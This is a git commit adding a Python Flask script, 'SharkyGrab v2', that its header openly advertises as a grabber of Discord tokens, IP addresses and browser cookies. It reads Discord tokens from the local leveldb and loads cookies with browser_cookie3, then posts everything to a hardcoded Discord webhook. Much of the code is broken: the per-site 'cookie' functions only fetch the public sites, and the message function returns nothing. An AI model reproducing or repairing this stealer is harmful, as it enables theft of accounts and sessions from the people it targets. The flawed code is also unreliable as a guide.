ca3469f3642d43166b88e18484b4dad08d4809ec
FralkA <153741594+FralkA@users.noreply.github.com>
2024-03-01 13:31:20 +0100

    Add files via upload

---
+++ Sam project.py
@@ -0,0 +1,274 @@
+#                                         (__________________________Author = FralkA_______________________)
+#  -------- 𝙎𝙝𝙖𝙧𝙠𝙮𝙂𝙧𝙖𝙗 v2 --------
+#  ______with a simple link_______ 
+#  -------- You can grab: --------
+#  -------- Discord Token --------          
+#  --------   ip adress   --------
+#  --------detect bot and --------
+#  --------     VPN       --------
+#  --------Browser Cookies--------
+#  -------- os and browser--------
+#  --------google  cookies--------
+#  -------- gmail cookies --------
+#  --------roblox  cookies--------
+#  --------tiktok  cookies--------
+#  -------- github cookies--------
+#  -------- insta cookies --------
+#  --------And after that --------
+#  --------The script send--------
+#  -------- A Message to a--------
+#  --------Discord Webhook--------
+
+#                                                                                                                ><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>⠀⠀⠀⠀⠀⠀
+#    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠟⠋⠉⠉⠙⠻⢿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀                                                     ><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⠻⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣷⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣀⣠⣤⣶⣶⣾⣿⣿⣿⢿⣿⣷⣦⣄⠀⠀⠙⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                          
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡿⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⠿⠛⠛⣏⠉⠉⢻⡄⠀⢹⠉⠛⣿⣧⡀⠀⠈⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠁⠀⠀⠀⢀⣤⣾⣿⣿⠿⠋⠉⣿⡀⠀⠀⢸⣦⠀⢸⣷⠀⢸⣧⠀⣿⠙⣿⡄⠀⠈⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠃⠀⠀⢀⣴⣿⣿⡿⠋⠹⣦⡀⠀⢿⣿⣆⠀⣿⣿⣇⣿⣿⣦⣿⣿⣄⣿⡇⣿⢻⡀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ><(((º>                𝙎𝙝𝙖𝙧𝙠𝙮 𝙂𝙧𝙖𝙗 
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡏⠀⠀⢠⣿⣿⠟⠁⢢⡀⠀⣿⣿⣦⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢀⣧⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣾⣿⠛⣆⠀⠘⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣿⡇⠀⠹⣿⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠈⢿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢿⡗⣦⣄⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡆⠀⢸⣇⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢿⣿⡷⠈⢿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣧⠀⠀⢿⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢻⣿⣿⡇⠀⠀⢻⠇⠀⠀⢿⠙⡟⢻⣉⡿⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷⡀                                                                      ⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡀⠀⠈⢷⣽⣿⣿⣿⣿⣿⣿⡏⠻⣿⣿⠀⠀⠙⢿⣇⣀⣤⣬⣤⣤⣤⡤⠶⠖⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣧⠀⠈⠙⠂⣠⣴⠿⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠘⣿⣿⣿⣿⡌⠛⠆⣠⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡆⠀⠀⠀                                ><(((º>⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠹⣿⡻⢄⣙⡴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡄⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣧⠀⠀                                                                   ><(((º>⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠚⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀
+#       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡄⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠸⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡆⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣷⣮⣛⠿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡀⠀
+#     ⠀⠀⠀⢀⣀⣠⣶⣾⣿⡿⠿⠛⠿⢿⣿⣿⣷⣾⣥⣄⣀⣀⣀⣀⣀⣀⠀⢀⣠⣶⣄⡀⢤⣀⣀⣀⣀⣤⣴⣶⣿⣿⣿⣿⠿⢿⣿⣿⣿⣶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣇⠀                         ><(((º>
+#      ⠈⠉⠉⠛⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠛⠛⣉⣤⣾⣿⣿⣿⣿⣿⣦⣀⠉⠛⠛⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠉⠛⠻⠿⠿⢿⣿⣿⣿⣶⣶⣶⣶⠶⠶⠶⠚⠋                                                           ><(((º>
+#       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⣿⣿⣿⠿⠛⠉⠉⠛⠻⢿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⠴⠶⠿⠿⠿⠛⠛⠋⠉⠀⡀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⠶⢶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+from flask import Flask, request,render_template
+import browser_cookie3
+import os
+import re
+import json
+import socket
+import httpagentparser
+import requests
+
+
+
+app = Flask(__name__)
+
+Webhook_URL = "https://discord.com/api/webhooks/1213100781046071327/j1urcwzdzOqUM03ZDh0MxOdC0khZ6WXBx6hVt3I6CW-fPewfE5zn8XaE6vJfIyjfbycO"
+
+# function to get ip
+def get_ip():
+    return request.remote_addr
+
+ip = get_ip()
+
+def botCheck(useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
+# Function to see if the ip adresse is connect to a vpn
+def check_vpn(ip_address):
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=proxy")
+        data = response.json()
+        return data["proxy"]
+    except Exception as e:
+        return False
+
+# Function to get general browser cookies
+def get_browser_cookies():
+    return browser_cookie3.load()
+
+# Function to find token discord and stock it
+def find_discord_tokens():
+    tokens = []
+    path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
+    for file_name in os.listdir(path):
+        if file_name.endswith('.ldb') or file_name.endswith('.log'):
+            with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))  # Regex pour trouver les tokens Discord
+    return tokens
+
+
+
+#Get tiktok cookies
+def retrieve_tiktok_cookies():    
+    url1 = "https://www.tiktok.com"
+
+    response1 = requests.get(url1)
+
+    tiktok_cookies = response1.cookies
+
+    if tiktok_cookies == True:
+        return tiktok_cookies
+    else:
+        return None
+
+
+#Get roblox cookies        
+def roblox_cookies():
+    url2 = "https://www.roblox.com"
+
+    response2 = requests.get(url2)
+
+    Roblox_cookies = response2.cookies
+    if Roblox_cookies == True:
+        return Roblox_cookies
+    else:
+        return False
+
+    
+#Get instagram cookies
+def instagram_cookies():
+    url3 = "https://www.instagram.com"
+
+    response3 = requests.get(url3)
+
+    Instagram_cookies = response3.cookies
+
+    if Instagram_cookies == True:
+        return Instagram_cookies
+    else:
+        return False
+    
+
+#Get github cookies
+def github_cookie():
+    url4 = "https://www.github.com"
+
+    reponse4 = requests.get(url4)
+
+    GitHub = reponse4.cookies
+    if GitHub == True:
+        return GitHub
+    else:
+        return False
+    
+#Get gmail cookies
+def gmail_cookies():
+    url5 = "https://www.gmail.com"
+
+    reponse5 = requests.get(url5)
+
+    Gmail = reponse5.cookies
+    if Gmail == True:
+        return Gmail
+    else:
+        return False
+    
+#Get google cookies
+def google_cookies():
+    url6 = "https://www.google.com"
+    
+    reponse6 = requests.get(url6)
+
+    Google = reponse6.cookies
+    if Google == True:
+        return Google
+    else:
+        return False
+
+#Get Snap cookies
+def Snap_cookies():
+    url7  = "https://www.snapchat.com"
+
+    reponse7  = requests.get(url7)
+    snap = reponse7.cookies
+    if snap == True:
+        return snap
+    else:
+        return False
+
+
+#Get youtube cookies                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+def youtube_cookies():
+    url8 = "https://wwww.youtube.com"
+
+    reponse8 = requests.get(url8)
+    youtube = reponse8.cookies
+
+    if youtube == True:
+        return youtube
+    else:
+        return False
+    
+
+
+
+def message():
+    ip_address = get_ip()
+    vpn = check_vpn(ip_address)
+    cookies = get_browser_cookies()
+    tokens = find_discord_tokens()
+    user_agent = request.headers.get('User-Agent')
+    browser, os_ = httpagentparser.simple_detect(user_agent)
+    Tik_Tok = retrieve_tiktok_cookies()
+    Roblox = roblox_cookies()
+    Insta = instagram_cookies()
+    Github = github_cookie()
+    Bot = botCheck()
+    gmail = gmail_cookies()
+    google = google_cookies()
+    Snap = Snap_cookies()
+    Youtube = youtube_cookies()
+    
+
+
+    "Hey, you grab anything !"
+
+    "THERE THEY ARE !!!"
+    "IP address : " + ip_address
+    "VPN : " + vpn
+    "Bot : " + Bot
+    "Browser cookies : " + str(cookies)
+    "Tokens Discord : " + tokens
+    "User-Agent : " + user_agent
+    "Browser : " + browser
+    "OS : " + os_
+    "TikTok cookies : " + Tik_Tok
+    "Roblox cookies  : " + Roblox
+    "instagram cookies : " + Insta
+    "Github cookies : " + Github
+    "Gmail cookies : " + gmail
+    'Google cookies : ' + google
+    "Snapchat cookies : " + Snap
+    "Youtube cookies : " + Youtube
+
+
+
+
+def send_to_webhook():
+    payload = {"content": message()}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(Webhook_URL, data=json.dumps(payload), headers=headers)
+
+
+@app.route('/')
+def script_on_login():
+    send_to_webhook()
+def index():
+    return render_template('index.html')
+    
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
